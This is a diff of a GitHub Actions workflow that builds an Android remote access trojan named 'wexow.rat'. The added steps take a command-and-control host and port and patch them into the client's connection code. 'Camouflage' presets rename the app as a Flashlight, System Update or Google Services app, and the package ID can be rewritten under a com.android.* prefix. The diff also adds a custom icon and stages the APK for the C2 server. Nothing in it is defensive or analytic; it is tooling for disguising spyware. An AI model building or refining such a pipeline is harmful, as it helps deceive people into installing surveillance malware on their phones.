@@ -11,6 +11,50 @@ on:
     paths:
       - 'client/**'
   workflow_dispatch:
+    inputs:
+      c2_host:
+        description: 'C2 server hostname or IP (e.g. 192.168.1.5 or c2.example.com)'
+        required: true
+        default: 'example.com'
+      c2_port:
+        description: 'C2 server WebSocket port (default: 3000)'
+        required: false
+        default: '3000'
+      app_name:
+        description: 'App display name shown on the device launcher'
+        required: false
+        default: 'System Update'
+      app_id:
+        description: 'Android application ID / package name (e.g. com.google.services)'
+        required: false
+        default: 'com.wexow.rat'
+      camouflage_preset:
+        description: 'Quick disguise preset (overrides app_name if not "custom")'
+        required: false
+        default: 'custom'
+        type: choice
+        options:
+          - custom
+          - flashlight
+          - battery_saver
+          - wifi_manager
+          - file_manager
+          - phone_cleaner
+          - system_update
+          - google_services
+          - device_health
+      app_icon_url:
+        description: 'Direct URL to a PNG icon (512×512 recommended). Leave blank to keep default.'
+        required: false
+        default: ''
+      version_name:
+        description: 'Version name string (e.g. 1.0.0)'
+        required: false
+        default: '1.0.0'
+      version_code:
+        description: 'Version code integer'
+        required: false
+        default: '1'
 
 jobs:
   build:
@@ -21,6 +65,103 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
+      # ── Camouflage preset resolution ──────────────────────────────────────
+      - name: Resolve camouflage preset
+        id: camouflage
+        run: |
+          PRESET="${{ github.event.inputs.camouflage_preset }}"
+          CUSTOM_NAME="${{ github.event.inputs.app_name }}"
+
+          case "$PRESET" in
+            flashlight)      NAME="Flashlight Pro"      ; ID_SUFFIX="flashlight.pro"  ;;
+            battery_saver)   NAME="Battery Saver"       ; ID_SUFFIX="battery.saver"   ;;
+            wifi_manager)    NAME="WiFi Manager"        ; ID_SUFFIX="wifi.manager"     ;;
+            file_manager)    NAME="File Manager"        ; ID_SUFFIX="file.manager"     ;;
+            phone_cleaner)   NAME="Phone Cleaner"       ; ID_SUFFIX="phone.cleaner"    ;;
+            system_update)   NAME="System Update"       ; ID_SUFFIX="system.update"    ;;
+            google_services) NAME="Google Services"     ; ID_SUFFIX="google.services"  ;;
+            device_health)   NAME="Device Health"       ; ID_SUFFIX="device.health"    ;;
+            *)               NAME="$CUSTOM_NAME"        ; ID_SUFFIX=""                 ;;
+          esac
+
+          # If app_id was not overridden and a preset suffix exists, auto-derive one
+          INPUT_ID="${{ github.event.inputs.app_id }}"
+          if [ "$PRESET" != "custom" ] && [ "$INPUT_ID" = "com.wexow.rat" ]; then
+            FINAL_ID="com.android.${ID_SUFFIX}"
+          else
+            FINAL_ID="$INPUT_ID"
+          fi
+
+          echo "app_name=$NAME"   >> $GITHUB_OUTPUT
+          echo "app_id=$FINAL_ID" >> $GITHUB_OUTPUT
+
+      # ── Patch C2 host in ConnectionManager ───────────────────────────────
+      - name: Patch C2 host
+        run: |
+          C2="${{ github.event.inputs.c2_host }}"
+          PORT="${{ github.event.inputs.c2_port }}"
+          FILE="client/app/src/main/java/com/wexow/rat/core/ConnectionManager.java"
+          # Replace HOST field
+          sed -i "s|public static String HOST = \".*\";|public static String HOST = \"${C2}\";|" "$FILE"
+          # If a PORT field exists, patch it too; otherwise inject after HOST line
+          if grep -q 'public static int PORT' "$FILE"; then
+            sed -i "s|public static int PORT = [0-9]*;|public static int PORT = ${PORT};|" "$FILE"
+          else
+            sed -i "/public static String HOST = /a\\    public static int PORT = ${PORT};" "$FILE"
+          fi
+
+      # ── Patch app display name ────────────────────────────────────────────
+      - name: Patch app name
+        run: |
+          APP_NAME="${{ steps.camouflage.outputs.app_name }}"
+          sed -i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">${APP_NAME}</string>|" \
+            client/app/src/main/res/values/strings.xml
+
+      # ── Patch application ID ──────────────────────────────────────────────
+      - name: Patch application ID
+        run: |
+          APP_ID="${{ steps.camouflage.outputs.app_id }}"
+          ORIGINAL="com.wexow.rat"
+          # build.gradle applicationId
+          sed -i "s|applicationId \"${ORIGINAL}\"|applicationId \"${APP_ID}\"|" \
+            client/app/build.gradle
+          # AndroidManifest package attribute (cosmetic, apk installer uses applicationId)
+          sed -i "s|package=\"${ORIGINAL}\"|package=\"${APP_ID}\"|" \
+            client/app/src/main/AndroidManifest.xml
+
+      # ── Download and apply custom icon ───────────────────────────────────
+      - name: Apply custom icon
+        if: ${{ github.event.inputs.app_icon_url != '' }}
+        run: |
+          pip install --quiet Pillow
+
+          ICON_URL="${{ github.event.inputs.app_icon_url }}"
+          curl -fsSL "$ICON_URL" -o /tmp/icon_source.png
+
+          python3 - <<'PYEOF'
+          import os
+          from PIL import Image
+
+          src = Image.open("/tmp/icon_source.png").convert("RGBA")
+          base = "client/app/src/main/res"
+          densities = {
+              "mipmap-mdpi":    48,
+              "mipmap-hdpi":    72,
+              "mipmap-xhdpi":   96,
+              "mipmap-xxhdpi":  144,
+              "mipmap-xxxhdpi": 192,
+          }
+          names = ["ic_launcher.png", "ic_launcher_round.png"]
+          for folder, size in densities.items():
+              path = os.path.join(base, folder)
+              os.makedirs(path, exist_ok=True)
+              resized = src.resize((size, size), Image.LANCZOS)
+              for name in names:
+                  resized.save(os.path.join(path, name), "PNG")
+                  print(f"  wrote {folder}/{name} ({size}x{size})")
+          PYEOF
+
+      # ── Java / SDK setup ──────────────────────────────────────────────────
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
@@ -39,22 +180,22 @@ jobs:
             "build-tools;30.0.3" \
             "platforms;android-34"
 
+      # ── Gradle cache ─────────────────────────────────────────────────────
       - name: Cache Gradle wrapper
         uses: actions/cache@v4
         with:
           path: ~/.gradle/wrapper
           key: gradle-wrapper-${{ hashFiles('client/gradle/wrapper/gradle-wrapper.properties') }}
-          restore-keys: |
-            gradle-wrapper-
+          restore-keys: gradle-wrapper-
 
       - name: Cache Gradle packages
         uses: actions/cache@v4
         with:
           path: ~/.gradle/caches
           key: gradle-caches-${{ hashFiles('client/**/*.gradle') }}
-          restore-keys: |
-            gradle-caches-
+          restore-keys: gradle-caches-
 
+      # ── Build ─────────────────────────────────────────────────────────────
       - name: Create local.properties
         working-directory: client
         run: echo "sdk.dir=$ANDROID_HOME" > local.properties
@@ -68,25 +209,48 @@ jobs:
         run: |
           export JAVA_HOME="$JAVA_HOME_11_X64"
           export PATH="$JAVA_HOME/bin:$PATH"
-          java -version
-          ./gradlew assembleDebug --stacktrace --no-daemon
+          ./gradlew assembleDebug \
+            --stacktrace \
+            --no-daemon \
+            -PversionName=${{ github.event.inputs.version_name || '1.0.0' }} \
+            -PversionCode=${{ github.event.inputs.version_code || '1' }}
 
-      - name: Verify APK
+      # ── Artifact ─────────────────────────────────────────────────────────
+      - name: Verify and stage APK
         id: apk
         run: |
           APK="client/app/build/outputs/apk/debug/app-debug.apk"
-          if [ ! -f "$APK" ]; then
-            echo "APK not found at $APK"
-            find client -name "*.apk" 2>/dev/null || true
-            exit 1
-          fi
-          echo "size=$(du -h $APK | awk '{print $1}')" >> $GITHUB_OUTPUT
+          [ -f "$APK" ] || { find client -name "*.apk" 2>/dev/null; exit 1; }
+
+          # Rename to reflect config
+          APP_LABEL=$(echo "${{ steps.camouflage.outputs.app_name }}" | tr ' ' '_' | tr '[:upper:]' '[:lower:]')
+          OUT="wexow-debug-${APP_LABEL}-${{ github.sha }}.apk"
+          cp "$APK" "$OUT"
+
+          echo "path=$OUT"                                 >> $GITHUB_OUTPUT
+          echo "size=$(du -h $OUT | awk '{print $1}')"     >> $GITHUB_OUTPUT
+          echo "app_name=${{ steps.camouflage.outputs.app_name }}" >> $GITHUB_OUTPUT
 
       - name: Copy to server directory
-        run: cp client/app/build/outputs/apk/debug/app-debug.apk server/base.apk
+        run: |
+          mkdir -p server
+          cp "${{ steps.apk.outputs.path }}" server/base.apk
 
       - name: Upload debug APK
         uses: actions/upload-artifact@v4
         with:
-          name: wexow-debug-${{ github.sha }}
-          path: client/app/build/outputs/apk/debug/app-debug.apk
+          name: debug-${{ steps.camouflage.outputs.app_name }}-${{ github.sha }}
+          path: ${{ steps.apk.outputs.path }}
+          retention-days: 30
+
+      - name: Build summary
+        run: |
+          echo "## Debug Build Summary" >> $GITHUB_STEP_SUMMARY
+          echo "| Field | Value |" >> $GITHUB_STEP_SUMMARY
+          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
+          echo "| App Name | ${{ steps.camouflage.outputs.app_name }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| App ID | ${{ steps.camouflage.outputs.app_id }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| C2 Host | ${{ github.event.inputs.c2_host }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| C2 Port | ${{ github.event.inputs.c2_port }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| APK Size | ${{ steps.apk.outputs.size }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Icon | ${{ github.event.inputs.app_icon_url != '' && 'Custom' || 'Default' }} |" >> $GITHUB_STEP_SUMMARY
